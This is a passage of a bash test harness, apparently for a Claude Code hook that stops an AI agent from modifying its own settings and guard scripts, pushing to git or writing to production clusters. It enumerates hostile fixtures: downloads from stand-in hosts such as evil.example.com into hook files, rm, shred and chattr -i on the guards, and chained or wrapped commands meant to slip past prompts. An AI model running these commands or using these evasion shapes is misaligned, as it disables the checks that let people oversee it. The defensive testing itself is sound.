#!/usr/bin/env bash
# shellcheck disable=SC2016,SC2088 # literal $VAR / ~ tokens are intentional test fixtures fed to the hook as data
# test-block-write-commands.sh — synthetic test harness for block-write-commands.sh.
#
# Feeds synthetic PreToolUse inputs to the hook and asserts the permissionDecision.
# Target: catch silent regressions in the protected-path regex (quote placements,
# home-dir forms, in-place mutators, destructive ops, canonical-source spoofing).
#
# Usage:
#   ./tests/test-block-write-commands.sh               # run all, fail-fast summary
#   ./tests/test-block-write-commands.sh -v            # verbose: print each test
#   HOOK=/path/to/hook.sh ./tests/test-block-write-commands.sh   # test a specific hook
#
# Exit code: 0 if all tests pass, 1 if any fail.
#
# Design notes:
#   - Tests are generated combinatorially across {attack vector} × {protected file}
#     × {home-dir form} × {quote placement} × {command-chain prefix}, to stress the
#     regex surface.
#   - Each test ships a JSON envelope like `{tool_input:{command:"…"}}` — matching the
#     Claude Code PreToolUse hook contract — and expects exit 2 (hard deny) or 0 (pass)
#     depending on whether the command represents an evasion or a canonical update.

set -u
TEST_HOME="${TEST_HOME:-$HOME}"
TEST_REPO_DIR="${TEST_REPO_DIR:-${TEST_HOME}/.github}"
HOOK="${HOOK:-$(cd "$(dirname "$0")/.." && pwd)/block-write-commands.sh}"
VERBOSE=0; [[ "${1:-}" == "-v" ]] && VERBOSE=1

if [[ ! -x "$HOOK" && ! -r "$HOOK" ]]; then
    echo "ERROR: hook not found or unreadable: $HOOK" >&2
    exit 1
fi

# ── helpers ───────────────────────────────────────────────────────────────────
declare -a TESTS_ALLOW TESTS_DENY TESTS_ASK
add_allow() { TESTS_ALLOW+=("$1"$'\t'"$2"); }
add_deny()  { TESTS_DENY+=("$1"$'\t'"$2"); }
add_ask()   { TESTS_ASK+=("$1"$'\t'"$2"); }

run_hook() {
    jq -c -n --arg cmd "$1" '{tool_input:{command:$cmd}, transcript_path:""}' \
        | bash "$HOOK" >/dev/null 2>&1
    return $?
}

# run_hook_ask: returns 0 iff the hook exits 0 AND outputs permissionDecision=ask.
run_hook_ask() {
    local out ec
    out=$(jq -c -n --arg cmd "$1" '{tool_input:{command:$cmd}, transcript_path:""}' \
        | bash "$HOOK" 2>/dev/null)
    ec=$?
    [[ $ec -ne 0 ]] && return 1
    echo "$out" | grep -q '"permissionDecision":"ask"'
}

# ── fixtures ──────────────────────────────────────────────────────────────────
# Protected files: the 7 paths gated by _prot in block-write-commands.sh.
PROT_FILES=(
  "settings.json"
  "hooks/block-write-commands.sh"
  "hooks/check-settings-version.sh"
  "settings-version"
  "settings-repo-path"
  "settings-repo-url"
  "settings-repo-ref"
)
# Quote placements to build paths: bare, home-wrapped (quote only around home form),
# and whole-path-wrapped (quote covers the entire path). Each varies with " and '.
path_variants() { # args: file
    local f="$1"
    printf '%s\n' \
        "~/.claude/${f}" \
        "\$HOME/.claude/${f}" \
        "\${HOME}/.claude/${f}" \
        "${TEST_HOME}/.claude/${f}" \
        "\"\$HOME\"/.claude/${f}" \
        "\"\${HOME}\"/.claude/${f}" \
        "\"${TEST_HOME}\"/.claude/${f}" \
        "'${TEST_HOME}'/.claude/${f}" \
        "'~'/.claude/${f}" \
        "\"\$HOME/.claude/${f}\"" \
        "\"\${HOME}/.claude/${f}\"" \
        "'${TEST_HOME}/.claude/${f}'" \
        "'~/.claude/${f}'"
}
# Command-chain prefixes: each test gets wrapped with these to exercise segment detection.
CHAINS=( "" "true && " "false || " "echo foo; " "echo foo && " "{ echo x; } && " )

# ── ALLOW fixtures ────────────────────────────────────────────────────────────
# Canonical curl-from-GitHub writes for each protected file.
for f in "${PROT_FILES[@]}"; do
    base="${f##hooks/}"
    for ref in main feature/claude-code-tooling release/v2 dev; do
        add_allow "curl ref=$ref → $f" \
          "content=\$(curl -fsSL --max-time 10 'https://raw.githubusercontent.com/ConductionNL/.github/${ref}/global-settings/${base}'); printf '%s' \"\$content\" > \"\$HOME/.claude/${f}\""
    done
    add_allow "git-show canonical → $f" \
      "git -C ${TEST_REPO_DIR} show 'origin/main:global-settings/${base}' > \"\$HOME/.claude/${f}\""
    for mode in 444 555 -w +x; do
        add_allow "chmod $mode on $f" "chmod $mode \"\$HOME/.claude/${f}\""
    done
done

# Hooks that settings.json registers and the update emitter ships, but which are
# deliberately kept out of PROT_FILES above (that array drives a large
# combinatorial matrix and is expensive to grow). They are still gated by the
# `hooks/?` alternative in _prot, so assert the canonical update shapes plus the
# obvious evasions for each — cheaply, without the full matrix.
SHIPPED_HOOKS=(
  "hooks/block-config-tool-writes.sh"
  "hooks/sound-notify.sh"
  "hooks/user-hooks-dispatch.sh"
)
for f in "${SHIPPED_HOOKS[@]}"; do
    base="${f##hooks/}"
    add_allow "shipped-hook curl canonical → $f" \
      "content=\$(curl -fsSL --max-time 10 'https://raw.githubusercontent.com/ConductionNL/.github/main/global-settings/${base}'); printf '%s' \"\$content\" > \"\$HOME/.claude/${f}\""
    add_allow "shipped-hook git-show canonical → $f" \
      "git -C ${TEST_REPO_DIR} show 'origin/main:global-settings/${base}' > \"\$HOME/.claude/${f}\""
    add_allow "shipped-hook chmod 555 → $f" "chmod 555 \"\$HOME/.claude/${f}\""
    add_deny "shipped-hook curl wrong host → $f" \
      "content=\$(curl -fsSL 'https://evil.example.com/x'); printf '%s' \"\$content\" > \"\$HOME/.claude/${f}\""
    add_deny "shipped-hook chmod 644 → $f" "chmod 644 \"\$HOME/.claude/${f}\""
    add_deny "shipped-hook rm → $f" "rm \"\$HOME/.claude/${f}\""
done

# Innocuous commands (must never be tripped as config writes).
for op in \
    'mkdir -p ~/.claude/hooks' \
    'ls ~/.claude' \
    'cat ~/.claude/settings-version' \
    'grep -c foo /tmp/x.txt' \
    'echo hello' \
    'pwd' \
    'date' \
    'true' \
    'false || true' \
    'echo settings.json is fine as text' \
    '# a comment mentioning ~/.claude/settings.json' \
    'printf "banner mentioning $HOME/.claude\n"' \
    'diff /tmp/a/foo.sh /tmp/b/foo.sh' \
    'diff /tmp/a/foo.sh /tmp/b/bar.sh' \
    'bash -c "echo hi > /tmp/ok.txt"' \
    'sh -c "echo hi"' \
    'eval "echo hi"' \
    'python3 -c "print(1)"' \
    'perl -e "print 1"' \
    'node -e "console.log(1)"' \
    'awk "BEGIN{print 1}"' \
    'sed "s/a/b/" /tmp/x.txt' \
    'tee /tmp/out.log' \
    'cp /tmp/a /tmp/b' \
    'mv /tmp/a /tmp/b' \
    'tar -cf /tmp/out.tar /tmp/a' \
    'rm /tmp/junk' \
    'truncate -s 0 /tmp/junk' \
    'git status' \
    'git log --oneline' \
    "git -C ${TEST_REPO_DIR} status"; do
    add_allow "innocuous: $op" "$op"
done

# npm ci is lockfile-pinned and must pass without a prompt.
add_allow "npm ci (lockfile-pinned)" "npm ci"
add_allow "npm ci --ignore-scripts" "npm ci --ignore-scripts"

# Destructive/in-place guard — the verb and its -i flag must come from the SAME
# command. The gap between them used to be [^|]*, which stops at a pipe but spans
# `;` and `&&`, so the guard could pair a verb from one command with a `-i` from
# another and hard-deny a read-only inspection as an "in-place edit". The command
# below only READS the protected path; `awk` and the `-i` belong to different
# commands and neither touches it.
FP_PROT_FILES=( "settings.json" "hooks/check-settings-version.sh" "settings-version" )
for f in "${FP_PROT_FILES[@]}"; do
    add_allow "verb/-i from different commands → $f" \
      "awk '{print}' /tmp/x; grep -c -i needle \"\$HOME/.claude/${f}\""
    # Controls: the narrowing must not let a genuine destructive op through,
    # including one after a command-chain prefix (section 4 below never exercises
    # the chained form for in-place mutators).
    add_deny "control: chained sed -i → $f" \
      "echo foo; sed -i 's/a/b/' \"\$HOME/.claude/${f}\""
    add_deny "control: chained truncate → $f" \
      "echo foo && truncate -s 0 \"\$HOME/.claude/${f}\""
done

# Separator characters inside a QUOTED ARGUMENT. This guard is plain text matching
# with no shell awareness, so it cannot tell a real command separator from the same
# character inside an argument. Narrowing the gap that precedes the protected path
# would make every command below stop matching — and for perl/awk/truncate/unlink,
# which have no generic fallback rule, that is a silent ALLOW of a real in-place
# edit. `sed -i "s/a/b/;s/c/d/" <path>` is an ordinary two-substitution script, not
# a contrived evasion. These must stay denied.
for f in "${FP_PROT_FILES[@]}"; do
    for wrap in \
        "sed -i \"s/a/b/;s/c/d/\" PATH" \
        "perl -i -pe 's/a/b/;s/c/d/' PATH" \
        "gawk -i inplace '{a=1;print}' PATH" \
        "sed -i 's/a/b/' \"x&&y\" PATH" \
        "truncate -s 0 \"a;b\" PATH" \
        "rm \"a;b\" PATH"; do
        add_deny "separator inside a quoted arg: ${wrap%% PATH*}… → $f" \
          "${wrap//PATH/\"\$HOME/.claude/${f}\"}"
    done
done

# Non-segment-start destructive verbs. These are the shapes that a
# `(^|[;&|]\s*)` anchor on the sed/perl/awk/gawk/ruby and truncate/shred/unlink
# arms would silently stop matching, because `(`, `{`, a leading space and a
# wrapper word are not command separators. The guard deliberately keeps a bare
# \bverb\b match on those two arms for exactly this reason — every command below
# genuinely mutates the protected path and must stay denied.
for f in "${FP_PROT_FILES[@]}"; do
    for wrap in \
        "  sed -i 's/a/b/' PATH" \
        "	sed -i 's/a/b/' PATH" \
        "(sed -i 's/a/b/' PATH)" \
        "{ sed -i 's/a/b/' PATH; }" \
        "env sed -i 's/a/b/' PATH" \
        "if true; then sed -i 's/a/b/' PATH; fi" \
        "  truncate -s 0 PATH" \
        "(truncate -s 0 PATH)" \
        "{ unlink PATH; }" \
        "env shred PATH"; do
        add_deny "non-segment-start: ${wrap%% PATH*}… → $f" \
          "${wrap//PATH/\"\$HOME/.claude/${f}\"}"
    done
done

# ── DENY fixtures ─────────────────────────────────────────────────────────────
# 1) Redirects: `>` and `>>` against every path variant.
for op in '>' '>>'; do
    for f in "${PROT_FILES[@]}"; do
        while IFS= read -r path; do
            for chain in "${CHAINS[@]}"; do
                add_deny "${chain:-base}redirect $op ${path:0:40}... → $f" \
                  "${chain}echo evil $op ${path}"
            done
        done < <(path_variants "$f")
    done
done

# 2) cp/mv with protected destination.
for cmd in cp mv; do
    for f in "${PROT_FILES[@]}"; do
        while IFS= read -r path; do
            for chain in "${CHAINS[@]}"; do
                add_deny "${chain:-base}$cmd → ${path:0:30}...$f" "${chain}$cmd /tmp/evil ${path}"
            done
        done < <(path_variants "$f")
    done
done

# 3) tee / tee -a targeting protected files.
for teeop in 'tee' 'tee -a'; do
    for f in "${PROT_FILES[@]}"; do
        while IFS= read -r path; do
            add_deny "$teeop → ${path:0:30}...$f" "echo x | $teeop ${path}"
        done < <(path_variants "$f")
    done
done

# 4) In-place mutators (sed -i / perl -i / awk -i / ruby -i / gawk -i).
for tool in 'sed -i' 'perl -i -pe' 'awk -i inplace' 'ruby -i -pe' 'gawk -i inplace'; do
    for f in "${PROT_FILES[@]}"; do
        while IFS= read -r path; do
            add_deny "$tool ${path:0:30}...$f" "$tool 's/x/y/' ${path}"
        done < <(path_variants "$f")
    done
done

# 5) Destructive tools.
for tool in 'truncate -s 0' 'shred' 'unlink' 'rm' 'rm -f' 'rm -rf'; do
    for f in "${PROT_FILES[@]}"; do
        while IFS= read -r path; do
            for chain in "${CHAINS[@]}"; do
                add_deny "${chain:-base}$tool ${path:0:30}...$f" "${chain}$tool ${path}"
            done
        done < <(path_variants "$f")
    done
done

# 6) Inline scripting languages (python / perl / node / ruby writing to protected files).
for lang in 'python -c' 'python3 -c' 'perl -e' 'node -e' 'ruby -e'; do
    for f in "${PROT_FILES[@]}"; do
        for path in "${TEST_HOME}/.claude" '$HOME/.claude' '${HOME}/.claude' '~/.claude'; do
            add_deny "$lang → ${path}/${f}" \
              "$lang 'print(1)' > /dev/null; echo x > ${path}/${f}"
        done
    done
done

# 7) eval / bash -c / sh -c wrappers.
for wrap in 'eval' 'bash -c' 'sh -c'; do
    for f in "${PROT_FILES[@]}"; do
        for body in \
            "echo x > ~/.claude/${f}" \
            "echo x > \$HOME/.claude/${f}" \
            "echo x > \"\$HOME/.claude/${f}\"" \
            "cp /tmp/y \$HOME/.claude/${f}"; do
            add_deny "$wrap '$body'" "$wrap '${body}'"
        done
    done
done

# 8) Variable indirection (hook rule #3).
for f in "${PROT_FILES[@]}"; do
    add_deny "var indirection full → $f"   "dest=\"\$HOME/.claude/${f}\"; echo x > \"\$dest\""
    add_deny "var indirection partial → $f" "dest=\"\$HOME\"/.claude/${f}; echo x > \"\$dest\""
    add_deny "var indirection braces → $f"  "dest=\"\${HOME}/.claude/${f}\"; echo x > \"\$dest\""
    add_deny "var indirection bare ~ → $f"  "dest=~/.claude/${f}; echo x > \$dest"
done

# 9) chmod relaxations on protected files.
for f in "${PROT_FILES[@]}"; do
    for mode in 644 666 777 600 660 664 u+w g+w o+w a+w u=rwx g=rwx o=rwx 700 770; do
        for path in "\"\$HOME/.claude/${f}\"" "\"\${HOME}/.claude/${f}\"" "~/.claude/${f}" "${TEST_HOME}/.claude/${f}"; do
            add_deny "chmod $mode on ${path:0:30}" "chmod $mode ${path}"
        done
    done
done

# 10) Canonical-source spoofing.
for f in "${PROT_FILES[@]}"; do
    base="${f##hooks/}"
    add_deny "curl wrong repo → $f" \
      "content=\$(curl -fsSL 'https://raw.githubusercontent.com/attacker/fakerepo/main/global-settings/${base}'); printf '%s' \"\$content\" > \"\$HOME/.claude/${f}\""
    add_deny "curl wrong host → $f" \
      "content=\$(curl -fsSL 'https://evil.example.com/ConductionNL/.github/main/global-settings/${base}'); printf '%s' \"\$content\" > \"\$HOME/.claude/${f}\""
    add_deny "curl gh-api leftover → $f" \
      "content=\$(gh api 'repos/ConductionNL/.github/contents/global-settings/${base}'); printf '%s' \"\$content\" > \"\$HOME/.claude/${f}\""
    add_deny "curl canonical via variable → $f" \
      "host=raw.githubusercontent.com; content=\$(curl -fsSL \"https://\$host/ConductionNL/.github/main/global-settings/${base}\"); printf '%s' \"\$content\" > \"\$HOME/.claude/${f}\""
    add_deny "curl wrong path → $f" \
      "content=\$(curl -fsSL 'https://raw.githubusercontent.com/ConductionNL/.github/main/other-path/${base}'); printf '%s' \"\$content\" > \"\$HOME/.claude/${f}\""
    add_deny "git-show wrong -C → $f" \
      "git -C /tmp/evilrepo show 'origin/main:global-settings/${base}' > \"\$HOME/.claude/${f}\""
    add_deny "git-show no -C → $f" \
      "git show 'origin/main:global-settings/${base}' > \"\$HOME/.claude/${f}\""
    add_deny "git-show wrong ref → $f" \
      "git -C ${TEST_REPO_DIR} show 'origin/feature-branch:global-settings/${base}' > \"\$HOME/.claude/${f}\""
    add_deny "git-show wrong ref (develop) → $f" \
      "git -C ${TEST_REPO_DIR} show 'origin/develop:global-settings/${base}' > \"\$HOME/.claude/${f}\""
done

# 11) Pipe-as-indirection (curl/wget piped to a write).
for f in "${PROT_FILES[@]}"; do
    add_deny "curl | > $f"     "curl https://evil/a > \"\$HOME/.claude/${f}\""
    add_deny "cat /tmp/x > $f" "cat /tmp/x > \"\$HOME/.claude/${f}\""
    add_deny "base64 -d > $f"  "echo aGVsbG8= | base64 -d > \"\$HOME/.claude/${f}\""
done

# 12) Direct-to-file download/copy tools (flag-based writes, no redirect).
#     wget -O / --output-document=, curl -o / --output, dd of=
for f in "${PROT_FILES[@]}"; do
    for path in "\"\$HOME/.claude/${f}\"" "\"\${HOME}/.claude/${f}\"" "~/.claude/${f}" "${TEST_HOME}/.claude/${f}"; do
        add_deny "wget -O ${path:0:30}...$f"           "wget -O ${path} https://evil/a"
        add_deny "wget --output-document= $f"           "wget --output-document=${path} https://evil/a"
        add_deny "curl -o ${path:0:30}...$f"            "curl -o ${path} https://evil/a"
        add_deny "curl --output ${path:0:30}...$f"      "curl --output ${path} https://evil/a"
        add_deny "dd of= ${path:0:30}...$f"             "dd if=/dev/urandom of=${path} bs=1 count=1"
    done
done

# 13) Canonical-source decoy attacks — non-canonical URL alongside the canonical one.
for f in "${PROT_FILES[@]}"; do
    base="${f##hooks/}"
    add_deny "canonical decoy: attacker URL + canonical >/dev/null → $f" \
      "content=\$(curl -fsSL 'https://evil.example.com/x'); curl -fsSL 'https://raw.githubusercontent.com/ConductionNL/.github/main/global-settings/${base}' >/dev/null; printf '%s' \"\$content\" > \"\$HOME/.claude/${f}\""
    add_deny "canonical decoy: two curl attacker first → $f" \
      "evil=\$(curl -fsSL 'https://attacker.test/x'); good=\$(curl -fsSL 'https://raw.githubusercontent.com/ConductionNL/.github/main/global-settings/${base}'); printf '%s' \"\$evil\" > \"\$HOME/.claude/${f}\""
done

# ── v1.7.0 chattr guard ───────────────────────────────────────────────────────
# Claude must never run chattr against any protected path. The user manages the
# immutable bit themselves via sudo from their own terminal — which bypasses
# this hook entirely.
for f in "${PROT_FILES[@]}"; do
    while IFS= read -r path; do
        add_deny "chattr -i → ${path:0:30}...$f" "chattr -i ${path}"
        add_deny "chattr +i → ${path:0:30}...$f" "chattr +i ${path}"
        add_deny "chattr =i → ${path:0:30}...$f" "chattr =i ${path}"
    done < <(path_variants "$f")
    add_deny "chained chattr → $f"      "true && chattr -i \$HOME/.claude/${f}"
    add_deny "sudo chattr → $f"          "sudo chattr -i \$HOME/.claude/${f}"
done
add_allow "chattr -i on /tmp/file"      "chattr -i /tmp/somefile"
add_allow "chattr +i on /var/log/foo"   "chattr +i /var/log/foo"

# ── v1.7.0 script-body scanner ────────────────────────────────────────────────
# When the command invokes a script (bash <path>, sh <path>, source <path>,
# . <path>, ./<path>), the hook reads the script body and re-checks it for
# protected-path writes.
SCRIPT_TMP=$(mktemp -d)
# Extend the existing PUSH_TMP trap so both temp dirs are cleaned up together.
# (Set after PUSH_TMP is created below; we register a final trap there.)

# Bad scripts: each contains a write operation against a protected file.
cat > "$SCRIPT_TMP/redirect.sh" <<'SCRIPT'
#!/bin/bash
echo evil > $HOME/.claude/settings.json
SCRIPT
cat > "$SCRIPT_TMP/cp_to_protected.sh" <<'SCRIPT'
#!/bin/bash
cp /tmp/evil ~/.claude/settings.json
SCRIPT
cat > "$SCRIPT_TMP/rm_protected.sh" <<'SCRIPT'
#!/bin/bash
rm $HOME/.claude/hooks/block-write-commands.sh
SCRIPT
cat > "$SCRIPT_TMP/chmod_protected.sh" <<'SCRIPT'
#!/bin/bash
chmod 644 $HOME/.claude/settings.json
SCRIPT
cat > "$SCRIPT_TMP/chattr_protected.sh" <<'SCRIPT'
#!/bin/bash
chattr -i $HOME/.claude/settings.json
SCRIPT
cat > "$SCRIPT_TMP/tee_protected.sh" <<'SCRIPT'
#!/bin/bash
echo evil | tee $HOME/.claude/settings.json
SCRIPT
cat > "$SCRIPT_TMP/sed_inplace.sh" <<'SCRIPT'
#!/bin/bash
sed -i 's/foo/bar/' $HOME/.claude/settings.json
SCRIPT
chmod 555 "$SCRIPT_TMP"/*.sh

# Innocuous scripts: must allow.
cat > "$SCRIPT_TMP/hello.sh" <<'SCRIPT'
#!/bin/bash
echo hello
SCRIPT
cat > "$SCRIPT_TMP/read_only.sh" <<'SCRIPT'
#!/bin/bash
# Mentions ~/.claude/settings.json in a comment and reads it, but never writes.
cat $HOME/.claude/settings.json | head -5
SCRIPT
chmod 555 "$SCRIPT_TMP/hello.sh" "$SCRIPT_TMP/read_only.sh"

# DENY: bad scripts invoked via each supported form.
for s in redirect.sh cp_to_protected.sh rm_protected.sh chmod_protected.sh chattr_protected.sh tee_protected.sh sed_inplace.sh; do
    add_deny "bash $s"          "bash $SCRIPT_TMP/$s"
    add_deny "sh $s"            "sh $SCRIPT_TMP/$s"
    add_deny "./$s direct"      "$SCRIPT_TMP/$s"
    add_deny "source $s"        "source $SCRIPT_TMP/$s"
    add_deny ". $s POSIX"       ". $SCRIPT_TMP/$s"
    add_deny "true && bash $s"  "true && bash $SCRIPT_TMP/$s"
done

# ALLOW: innocuous scripts via each form.
for s in hello.sh read_only.sh; do
    add_allow "bash $s safe"        "bash $SCRIPT_TMP/$s"
    add_allow "./$s direct safe"    "$SCRIPT_TMP/$s"
    add_allow "source $s safe"      "source $SCRIPT_TMP/$s"
done

# ALLOW: nonexistent script path (false-positive guard — body scan silently no-ops).
add_allow "bash <nonexistent>"      "bash /tmp/does-not-exist-fixture-$$.sh"
# ALLOW: bash -c form (inline string, no file to scan; existing inline guards cover it).
add_allow "bash -c innocuous"       'bash -c "echo hi > /tmp/ok"'

# --legacy-peer-deps must be hard-blocked (papers over real peer-dep mismatches).
# Rule scope is npm/pnpm/yarn/bun — keep fixtures for all four so future regex
# narrowing (e.g. `npm\s+install\s+--legacy-peer-deps`) can't silently drop coverage.
add_deny "npm install --legacy-peer-deps" "npm install --legacy-peer-deps"
add_deny "npm i --legacy-peer-deps" "npm i --legacy-peer-deps"
add_deny "npm install --legacy-peer-deps=true" "npm install --legacy-peer-deps=true"
add_deny "npm install --legacy-peer-deps=false" "npm install --legacy-peer-deps=false"
add_deny "chained: cd && npm install --legacy-peer-deps" "cd /tmp/foo && npm install --legacy-peer-deps"
add_deny "wrapped in bash -c" 'bash -c "npm install --legacy-peer-deps"'
add_deny "wrapped in timeout + bash -c" 'timeout 500 bash -c "npm install --legacy-peer-deps 2>&1 | tail -15"'
add_deny "pnpm i --legacy-peer-deps" "pnpm i --legacy-peer-deps"
add_deny "yarn add --legacy-peer-deps" "yarn add lodash --legacy-peer-deps"
add_deny "bun install --legacy-peer-deps" "bun install --legacy-peer-deps"

# ── ASK fixtures ──────────────────────────────────────────────────────────────
# Package manager installs — every form should prompt for approval, not pass silently.
add_ask "npm install" "npm install lodash"
add_ask "npm i shorthand" "npm i lodash"
add_ask "npm add" "npm add lodash"
add_ask "chained: cd && npm install" "cd /tmp && npm install"
add_ask "chained: true && npm i" "true && npm i lodash"
add_ask "pnpm install" "pnpm install"
add_ask "pnpm i shorthand" "pnpm i lodash"
add_ask "pnpm add" "pnpm add lodash"
add_ask "yarn install" "yarn install"
add_ask "yarn add" "yarn add lodash"
add_ask "bun install" "bun install"
add_ask "bun add" "bun add lodash"

# Redirect guard — a /dev/null decoy must not suppress the ask for a real redirect.
add_ask "redirect: relative target + /dev/null decoy" "echo x > outfile; true >/dev/null"

# ── v2.6.0 production is read-only ────────────────────────────────────────────
# kubectl/oc/helm writes against a *-prod namespace or context are hard-denied;
# reads pass; non-prod is not this guard's business.
add_deny "prod: kubectl delete -n"              "kubectl -n openwoo-prod delete pod nextcloud-0"
add_deny "prod: kubectl delete, ns after verb"  "kubectl delete pod nextcloud-0 -n openwoo-prod"
add_deny "prod: --namespace=… form"             "kubectl delete pod x --namespace=keepiq-prod"
add_deny "prod: --context"                      "kubectl --context emk-prod apply -f x.yaml"
add_deny "prod: exec"                           "kubectl exec -n keepiq-prod deploy/nextcloud -- php occ status"
add_deny "prod: cp"                             "kubectl cp ./x keepiq-prod/nextcloud-0:/tmp/x"
add_deny "prod: rollout restart"                "kubectl rollout restart deploy/nextcloud -n openwoo-prod"
add_deny "prod: scale"                          "kubectl -n openwoo-prod scale deploy/x --replicas=0"
add_deny "prod: oc delete"                      "oc -n openwoo-prod delete pod x"
add_deny "prod: helm upgrade"                   "helm upgrade nc ./chart -n openwoo-prod"
add_deny "prod: helm rollback"                  "helm rollback nc 3 --kube-context emk-prod"
add_deny "prod: env assignment first"           "KUBECONFIG=/x/cfg kubectl -n openwoo-prod delete pod y"
add_deny "prod: chained after a read"           "kubectl get pods -n openwoo-prod && kubectl -n openwoo-prod delete pod y"
add_deny "prod: inside bash -c"                 "bash -c \"kubectl -n openwoo-prod delete pod y\""
add_deny "prod: after an ask-guard (gh)"        "gh pr create --title t --body b && kubectl -n openwoo-prod delete pod y"
add_deny "prod: heredoc fed to bash"            $'bash <<\'EOF\'\nkubectl -n openwoo-prod delete pod y\nEOF'
add_allow "prod: get"                           "kubectl get pods -n openwoo-prod"
add_allow "prod: logs"                          "kubectl logs -n openwoo-prod nextcloud-0 --tail=50"
add_allow "prod: describe"                      "kubectl -n openwoo-prod describe pod nextcloud-0"
add_allow "prod: rollout status"                "kubectl rollout status deploy/x -n openwoo-prod"
add_allow "prod: helm list/status"              "helm status nc -n openwoo-prod"
add_allow "non-prod: delete on accept"          "kubectl -n openwoo-accept delete pod x"
add_allow "prod word, no kubectl"               "grep -rn openwoo-prod plans/"
add_allow "prod: mentioned in a commit message" "git commit -m 'kubectl -n openwoo-prod delete is blocked now'"
add_allow "prod: in a heredoc commit message"   $'git commit -F - <<\'EOF\'\ndocs: kubectl -n openwoo-prod delete pod x is blocked\nEOF'

# ── v2.6.0 git push: data is not a push ───────────────────────────────────────
# A commit message or PR body that mentions `git push` is data. Everything that
# can still execute a push stays denied (no auth phrase in these fixtures).
add_allow "push: -m message mentions git push"  "git commit -m \"document the git push flow\""
add_allow "push: single-quoted message"         "git commit -m 'git push is authorized by phrase'"
add_allow "push: heredoc commit message"        $'git commit -F - <<\'EOF\'\nfix: explain why git push needs a phrase\nEOF'
add_allow "push: tag annotation"                "git tag -a v1.2.3 -m 'run git push --tags afterwards'"
add_ask   "push: gh pr body mentions git push"  "gh pr create --title t --body \"after merge, git push the tag\""
add_ask   "push: cat > file heredoc"            $'cat > notes.md <<\'EOF\'\ngit push origin main\nEOF'
add_deny  "push: still denied after a commit"   "git commit -m 'x' && git push"
add_deny  "push: heredoc fed to bash"           $'bash <<\'EOF\'\ngit push origin main\nEOF'
add_deny  "push: cat heredoc piped to bash"     $'cat <<\'EOF\' | bash\ngit push origin main\nEOF'
add_deny  "push: heredoc fed to python"         $'python3 - <<\'EOF\'\nimport os; os.system("git push")\nEOF'
add_deny  "push: eval"                          "eval \"git push origin main\""
add_deny  "push: command substitution in -m"    "git commit -m \"\$(git push origin main)\""
add_deny  "push: backticks in -m"               "git commit -m \"\`git push\`\""
add_deny  "push: bash -c"                       "bash -c 'git push'"
add_deny  "push: after the heredoc ends"        $'git commit -F - <<\'EOF\'\nmsg\nEOF\ngit push origin main'

# ── v2.7.2 git push: every form, checked before any ask ───────────────────────
# An ask exits the hook. Before v2.7.2 the push check came after the git -C,
# gh, curl and docker asks, so one approval of that prompt also ran a chained
# push without the phrase. git's global options before `push` were not
# recognised at all. No auth phrase in these fixtures → every push is denied.
add_deny  "push v2.7.2: after git -C commit"      "git -C repo commit -m x && git push"
add_deny  "push v2.7.2: after git -C add, -C push" "git -C repo add . && git -C repo push origin main"
add_deny  "push v2.7.2: git -C push alone"        "git -C /home/u/repo push"
add_deny  "push v2.7.2: after gh pr create"       "gh pr create --title t --body b && git push"
add_deny  "push v2.7.2: after gh api POST"        "gh api -X POST repos/o/r/issues -f title=t; git push"
add_deny  "push v2.7.2: after curl POST"          "curl -X POST https://example.test && git push"
add_deny  "push v2.7.2: after docker compose up"  "docker compose up -d; git push"
add_deny  "push v2.7.2: after git branch -D"      "git branch -D old && git push origin --delete old"
add_deny  "push v2.7.2: after rm"                 "rm build.log && git push"
add_deny  "push v2.7.2: after npm install"        "npm install && git push"
add_deny  "push v2.7.2: -c key=value"             "git -c user.name=x push"
add_deny  "push v2.7.2: -c quoted value"          "git -c user.name=\"A B\" push origin main"
add_deny  "push v2.7.2: -c single-quoted value"   "git -c 'core.sshCommand=ssh -i k' push"
add_deny  "push v2.7.2: --no-pager"               "git --no-pager push"
add_deny  "push v2.7.2: -P"                       "git -P push --force"
add_deny  "push v2.7.2: --git-dir=path"           "git --git-dir=/r/.git push"
add_deny  "push v2.7.2: --git-dir path"           "git --git-dir /r/.git push"
add_deny  "push v2.7.2: --work-tree path"         "git --work-tree /x push"
add_deny  "push v2.7.2: -C quoted path"           "git -C \"/a b\" push"
add_deny  "push v2.7.2: -C and -c stacked"        "git -C repo -c a=b --no-pager push"
add_deny  "push v2.7.2: message stripped, push kept" "git -C r --no-pager commit -m \"a git push b\" && git push"
add_ask   "push v2.7.2: -C commit, message mentions push" "git -C repo commit -m \"explain git push\""
add_ask   "push v2.7.2: -C tag, annotation mentions push" "git -C repo tag -a v1 -m 'then git push --tags'"
add_allow "push v2.7.2: dir named push"           "git -C push status"
add_allow "push v2.7.2: --no-pager log --author push" "git --no-pager log --author push"
add_allow "push v2.7.2: -C log --grep push"       "git -C repo log --grep push"

# ── v2.7.3 a hard deny wins over an ask, in any order ─────────────────────────
# Before v2.7.3 ask() exited the hook on the spot, so every hard deny placed
# below an ask guard in the file was never reached for a chained command: one
# approval of `gh pr create … && date -s …` also ran the date -s. Each prompting
# command below is chained with each hard-denied one — before, after, and with
# `;` — and every combination must be denied.
ASK_PREFIXES=(
    "curl -X POST https://example.test"
    "curl -o out.html https://example.test"
    "docker run --rm alpine true"
    "docker compose up -d"
    "gh api -X POST repos/o/r/issues -f title=t"
    "gh pr create --title t --body b"
    "gh issue comment 1 --body b"
    "git -C repo commit -m x"
    "git -C repo stash"
    "git branch -D old"
    "git remote add up https://example.test/r.git"
    "env FOO=1 make"
    "cat a > b"
    "find . -name x -delete"
    "sort -o out.txt in.txt"
    "awk 'BEGIN{system(\"true\")}'"
    "echo x | tee out.txt"
    "hostname newname"
    "rm build.log"
    "rmdir emptydir"
    "npm audit fix"
    "npm install"
    "echo x > out.txt"
    "ln -s a b"
    "sed -i s/a/b/ f.txt"
    "chown u f.txt"
    "install -m 644 a b"
    "echo aGk= | base64 -d"
    "eval true"
)
DENY_SUFFIXES=(
    "date -s 2020-01-01"
    "date --set=2020-01-01"
    "npm ci --legacy-peer-deps"
    "ln -s /tmp/x ~/.claude/${PROT_FILES[0]}"
    "bash $SCRIPT_TMP/redirect.sh"
    "cd /mnt/c/Users"
    "cat /mnt/c/Windows/win.ini"
    "powershell.exe -c dir"
    "wsl -e ls"
    "kubectl -n openwoo-prod delete pod x"
    "git push origin main"
)
for a in "${ASK_PREFIXES[@]}"; do
    add_ask "order v2.7.3: prompts on its own | $a" "$a"
    for d in "${DENY_SUFFIXES[@]}"; do
        add_deny "order v2.7.3: ask && deny | $a && $d" "$a && $d"
        add_deny "order v2.7.3: ask ; deny | $a ; $d"  "$a; $d"
